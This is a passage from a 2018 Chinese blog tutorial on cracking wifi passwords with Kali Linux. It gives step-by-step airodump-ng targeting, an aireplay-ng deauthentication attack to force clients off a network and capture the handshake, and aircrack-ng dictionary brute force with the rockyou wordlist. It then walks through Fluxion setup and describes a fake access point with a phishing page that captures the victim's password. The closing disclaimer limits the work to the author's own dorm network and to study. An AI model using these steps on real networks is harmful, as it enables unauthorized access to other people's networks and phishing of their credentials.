<p>更多详尽的专业解释可见：<a href="https://wenku.baidu.com/view/1907172e7375a417866f8f30.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/1907172e7375a417866f8f30.html</a></p>
<p>当你执行如上命令之后，的确可以侦测到附近所有的wifi接入点，但是我们确定了破解的wifi目标之后，我们需要对结果进行一些特定的限制（筛选）以便更为方便的分析，指定探测命令如下：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon --bssid <span class="string">[目标MAC地址]</span> -c <span class="string">[频道]</span> -w <span class="string">[抓包结果的文件名]</span></span><br></pre></td></tr></table></figure></p>
<p>其中<code>STATION</code>表示目前连接该wifi下的设备的MAC地址</p>
<h4 id="aireplay-ng抓包"><a href="#aireplay-ng抓包" class="headerlink" title="aireplay-ng抓包"></a><a href="http://www.aircrack-ng.org/doku.php?id=aireplay-ng" target="_blank" rel="noopener">aireplay-ng</a>抓包</h4><p>对指定wifi进行探测之后，有时我们并不会主动对该wifi进行抓包操作，原因是在我们使用<code>airodump</code>的时候，原设备就已经连接到我们的目标wifi了，此时要想抓包，我们需要使用到<code>aireplay-ng</code>来对目标设备进行强制断开连接，待其自动连接之后我们也就抓到包了，命令如下：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a <span class="string">[接入点MAC地址]</span> -c <span class="string">[客户端接入地址]</span> wlan0mon</span><br></pre></td></tr></table></figure></p>
<p>执行结果如下：<br><img src="http://pjq6e477y.bkt.clouddn.com/7.jpg" width="400"></p>
<p><img src="http://pjq6e477y.bkt.clouddn.com/8.jpg" width="400"></p>
<blockquote>
<p>解释：上述的包与爬虫抓包类似，可以简单的理解为含有我们需要重要信息的文件。</p>
</blockquote>
<h4 id="aircrack-ng-破解"><a href="#aircrack-ng-破解" class="headerlink" title="aircrack-ng 破解"></a><a href="http://www.aircrack-ng.org/doku.php?id=aircrack-ng" target="_blank" rel="noopener">aircrack-ng</a> 破解</h4><p>通过上述操作，我们已经成功抓包了，通过以下命令来查看抓包文件:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root</span> &amp;&amp; <span class="keyword">ls</span></span><br></pre></td></tr></table></figure></p>
<p><img src="http://pjq6e477y.bkt.clouddn.com/9.jpg" width="400"></p>
<p>我们破解时主要用到的是<code>.cap</code>文件，破解命令如下：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w <span class="string">[字典文件]</span> <span class="string">[.cap文件]</span></span><br></pre></td></tr></table></figure></p>
<p>Kali自带的字典文件目录有以下几个（比较小）：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/john/</span></span><br><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/wfuzz/</span>wordlist/</span><br><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/wordlists/</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>解释：暴力破解，顾名思义就是我们需要准备一个尽量详尽且可能较大的字典文件，该文件中也许包含了小至以M为单位的秘钥文件，大至以G为单位的秘钥文件，然后使用<code>aircrack-ng</code>一个个去暴力破解，待其找到正确秘钥之后就会自动终止程序。通过如上解释，所以说如果我们的字典足够完整，也许在你睡一觉之后即可破解，此时的你需要对收获与时间成本进行考量，，还有一种情况就是几天下来直至字典跑完也没有成功破解wifi，原因就是使用的字典中未含有正确秘钥。</p>
<p>补充：1. 可通过彩虹表的方法来增大跑字典的效率。2. 可以使用GPU来增大跑字典的效率。3. 可使用kali内置的crunch工具自动生成字典。<br>以上补充有兴趣的可以去了解，这里就不详细说明了，有时间的话也许会在后面的文章单独成文。</p>
</blockquote>
<p>常用命令：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep [Password] [字典] <span class="comment"># 查看字典中是否含有目标秘钥</span></span><br><span class="line">cat [字典] | wc -l <span class="comment"># 查看字典文件有多少行数据</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/usr/share/wordlists</span> &amp;&amp; gunzip rockyou.txt.gz <span class="comment"># 解压Kali自带rockyou.txt.gz文件</span></span><br></pre></td></tr></table></figure></p>
<p>使用<code>aircrack-ng</code>之后，如果破解成功将显示如下内容：<br><img src="http://pjq6e477y.bkt.clouddn.com/10.jpg" width="400"></p>
<h3 id="Fluxion社会工程学破解"><a href="#Fluxion社会工程学破解" class="headerlink" title="Fluxion社会工程学破解"></a>Fluxion社会工程学破解</h3><p>以上是Kali暴力破解的内容，但往往我们使用暴力破解的结果不尽如人意，此时我们可以考虑Fluxion社会工程学来进行破解。社会工程学是很高深的一门学问，为了吊大家的胃口这里就简单的说下：好像是外国一名黑客入侵攻击之后被抓坐牢，然后出了一本书。强烈推荐大家去了解下，很有意思的 (￣_,￣ )，像许多电影亦或是电视剧都有相关内容的出现，比如《Who am i，没有绝对的安全系统》、《黑客军团》，为了让该推荐在该文章中更加的醒目些，以下博主推荐的连接内容务必前去看看，相当有意思的，不感兴趣的话那就算了(ノへ￣、)：</p>
<font color="red" size="15">
https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/2136830?fr=aladdin
https://baike.baidu.com/item/%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF/10253577
</font>

<p>好了，社会工程学介绍完了，我们来讲讲Flusion的使用吧（前面已经安装过了，忘了的可往回翻一翻）。<br><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=174774335,59681927&fm=26&gp=0.jpg" width="300"></p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root/</span>   <span class="comment"># 进入root目录（根据自己的Fluxion安装路径）</span></span><br><span class="line"><span class="keyword">ls</span>  <span class="comment"># 列出当前所有文件，查看是否含有fluxion</span></span><br><span class="line"><span class="keyword">cd</span> fluxion  <span class="comment"># 进入fluxion</span></span><br><span class="line"><span class="keyword">ls</span>  <span class="comment"># 查看该项目内的文件，具体文件介绍可自行查找资料，这里接不说了</span></span><br><span class="line"><span class="string">./fluxion.sh</span>    <span class="comment"># 启动fluxion</span></span><br></pre></td></tr></table></figure>
<p>启动之后，你或许会看见如下内容：<br><img src="http://pjq6e477y.bkt.clouddn.com/12.jpg" width="400"></p>
<p>内容显示你当前kali中并没有安装相关插件，我们可通过如下进行安装：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install XXXXXX  # XXXXXX表示的是未安装的插件，比如apt-<span class="builtin-name">get</span> install bc，将所有的插件安装一遍即可</span><br></pre></td></tr></table></figure></p>
<p>安装之后我们再次执行fluxion:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root/fluxion</span> &amp;&amp; <span class="string">./fluxion.sh</span></span><br></pre></td></tr></table></figure></p>
<p>初次接触fluxion的朋友可能不知道怎么操作，但具体操作也没有那什么难度，所以这里就贴图简单的解释一下。</p>
<ul>
<li>选择语言<br><img src="http://pjq6e477y.bkt.clouddn.com/13.jpg" width="400"></li>
</ul>
<p>从上图我们可以看到有11个选项，每个选项对应一种语言操作，这里我们直接选择<code>6：chinese</code></p>
<ul>
<li>选择网卡<br><img src="http://pjq6e477y.bkt.clouddn.com/14.jpg" width="400"></li>
</ul>
<p>此处是网卡的选择，当你插上USB无线网卡并成功连接之后，虚拟机会自动监听，所以直接默认即可</p>
<ul>
<li>选择信道并开始监听<br><img src="http://pjq6e477y.bkt.clouddn.com/15.jpg" width="400"><br><img src="http://pjq6e477y.bkt.clouddn.com/16.jpg" width="400"></li>
</ul>
<p>这里我们选择所有信道，选择之后将会出现类似之前跑字典的信道界面，当看见你想要破解的wifi之后我们需要执行<code>ctrl+c</code>退出即可</p>
<ul>
<li>选择目标<br><img src="http://pjq6e477y.bkt.clouddn.com/17.jpg" width="400"></li>
</ul>
<p>选择目标wifi代号</p>
<ul>
<li>创建AP<br><img src="http://pjq6e477y.bkt.clouddn.com/18.jpg" width="400"></li>
</ul>
<p>因为这里我们使用的是社会工程学来进行欺骗，所以我们需要创建一个伪装AP来供目标连接，直接选择1即可</p>
<p>——————————————————————————————分割线——————————————————————————————</p>
<p>后面的内容就是真正的拦截过程，由于现在室友正在使用wifi，这里就暂时写到这了，以后有机会再来补充。简单的介绍一下吧：</p>
<p>首先执行生成一个<code>web</code>站点，该站点为钓鱼网站，主要用于目标登录其Wifi。我们执行命令之后，目标路由器或者交换机上所连接的设备将会自动断开，此后将会自动生成一个我们伪装的AP，待目标设备连接上该AP之后将会自动跳转到钓鱼站点，待其输入密码后我们既能在Kali终端下得到目标wifi的密码，得到密码之后程序将会自动终止，目标wifi也将恢复正常。</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是本文所有wifi的破解方法了，如果日后接触到了其他其他方法再在本文进行更新。最后，在这里再提醒一下：</p>
<p><font color="red">任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文只供学习，切勿用于非法操作，一切后果由使用者本人负责。</font></p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1544806153437&di=fe3bcd2093a5fc81f192d946c618a173&imgtype=0&src=http%3A%2F%2Fwx4.sinaimg.cn%2Fbmiddle%2Fedadc0ebgy1fpn86qcibkj20hs0jkq69.jpg" width="300"></h2><div style="text-align: right">2018-10-12,By Zero</div>
        </div></article>
      <nav class="pagination"><a class="next" href="/page/2/">
        <span class="next-text">下一页</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></section></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
        <a href="https://github.com/ahonn" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2015 - 2019<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">Aaron Li</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.10.2"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
